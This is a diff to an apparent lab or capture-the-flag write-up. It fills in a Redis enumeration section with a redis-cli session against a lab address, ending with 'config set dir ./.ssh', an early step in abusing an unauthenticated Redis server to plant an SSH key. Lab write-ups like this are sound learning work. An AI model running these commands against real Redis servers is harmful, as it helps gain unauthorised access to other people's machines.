@@ -78,7 +78,20 @@ Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds
 
 ### Redis Enumeration
 
-Detail findings from each open port/service.
+```
+redis-cli -h 10.129.140.170
+10.129.140.170:6379> config get dir
+1) "dir"
+2) "/var/lib/redis"
+10.129.140.170:6379> config set dir ./.ssh
+OK
+10.129.140.170:6379> config get dir
+3) "dir"
+4) "/var/lib/redis/.ssh"
+
+```
+
+### Redis Exploitation
 
 ---
 ## Foothold
